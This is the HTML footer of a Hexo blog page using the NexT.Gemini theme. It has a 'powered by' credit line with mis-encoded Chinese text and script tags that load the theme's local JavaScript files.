  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
